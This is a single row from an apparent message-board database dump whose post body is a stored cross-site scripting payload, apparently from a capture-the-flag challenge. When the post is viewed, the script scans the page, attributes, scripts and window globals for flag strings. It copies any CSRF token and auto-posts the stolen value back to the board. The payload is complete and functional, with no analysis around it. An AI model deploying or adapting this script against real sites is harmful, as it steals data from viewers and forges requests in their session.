(6592,'hi','<script>\r\n(function(){\r\n  try {\r\n    var re = /FLAG\\{.*?\\}|flag\\{.*?\\}|CTF\\{.*?\\}/i;\r\n    function findFlag() {\r\n      // 1) Search visible text\r\n      var txt = document.documentElement.innerText || \'\';\r\n      var m = txt.match(re);\r\n      if (m) return m[0];\r\n      // 2) Search attributes\r\n      var all = document.querySelectorAll(\'*\');\r\n      for (var i=0;i<all.length;i++){\r\n        var a = all[i].attributes;\r\n        for (var j=0;j<a.length;j++){\r\n          var v = a[j].value;\r\n          if (v && re.test(v)) return v.match(re)[0];\r\n        }\r\n      }\r\n      // 3) Search script tags\r\n      for (var s=0;s<document.scripts.length;s++){\r\n        var sc = document.scripts[s].textContent || \'\';\r\n        var mm = sc.match(re);\r\n        if (mm) return mm[0];\r\n      }\r\n      // 4) Search window globals (lightweight)\r\n      try {\r\n        var props = Object.getOwnPropertyNames(window);\r\n        for (var p=0;p<props.length;p++){\r\n          try {\r\n            var val = window[props[p]];\r\n            if (typeof val === \'string\' && re.test(val)) return val.match(re)[0];\r\n          } catch(e){}\r\n        }\r\n      } catch(e){}\r\n      return null;\r\n    }\r\n\r\n    function postFlag(flag) {\r\n      try {\r\n        // Build a normal form POST to /board.php (same-origin)\r\n        var f = document.createElement(\'form\');\r\n        f.method = \'POST\';\r\n        f.action = \'/board.php\'; // adjust if the posting endpoint is different\r\n        // title field\r\n        var t = document.createElement(\'input\');\r\n        t.type = \'hidden\'; t.name = \'title\'; t.value = \'Flag found\';\r\n        f.appendChild(t);\r\n        // message field (the flag)\r\n        var m = document.createElement(\'input\');\r\n        m.type = \'hidden\'; m.name = \'message\'; m.value = flag;\r\n        f.appendChild(m);\r\n\r\n        // If the page uses a CSRF token stored in a hidden input or meta tag, try to copy it\r\n        // common token patterns: <input name=\"csrf\" value=\"...\"> or <meta name=\"csrf\" content=\"...\">\r\n        var token = null;\r\n        var tokInput = document.querySelector(\'input[name*=csrf], input[name*=token]\');\r\n        if (tokInput) { token = {name: tokInput.name, value: tokInput.value}; }\r\n        else {\r\n          var tokMeta = document.querySelector(\'meta[name*=csrf], meta[name*=token]\');\r\n          if (tokMeta) token = {name: \'csrf\', value: tokMeta.getAttribute(\'content\')};\r\n        }\r\n        if (token) {\r\n          var ti = document.createElement(\'input\');\r\n          ti.type=\'hidden\'; ti.name=token.name; ti.value=token.value;\r\n          f.appendChild(ti);\r\n        }\r\n\r\n        document.body.appendChild(f);\r\n        f.submit();\r\n      } catch(e){}\r\n    }\r\n\r\n    // Keep trying: check now and every 2 seconds for up to 5 minutes\r\n    var tries = 0, maxtries = 150;\r\n    var id = setInterval(function(){\r\n      tries++;\r\n      var flag = findFlag();\r\n      if (flag) {\r\n        clearInterval(id);\r\n        try { postFlag(flag); } catch(e){}\r\n        // Also show it in the admin UI so admin sees the new submission (optional)\r\n        try {\r\n          var n = document.createElement(\'div\');\r\n          n.style.position=\'fixed\'; n.style.right=\'10px\'; n.style.top=\'10px\';\r\n          n.style.background=\'yellow\'; n.style.padding=\'6px\'; n.style.zIndex=9999999;\r\n          n.textContent = \'FLAG auto-submitted: \' + flag;\r\n          document.body.appendChild(n);\r\n        } catch(e){}\r\n      } else if (tries > maxtries) {\r\n        clearInterval(id);\r\n      }\r\n    }, 2000);\r\n  } catch(e){}\r\n})();\r\n</script>\r\n',0,'2025-11-03 21:48:21'),
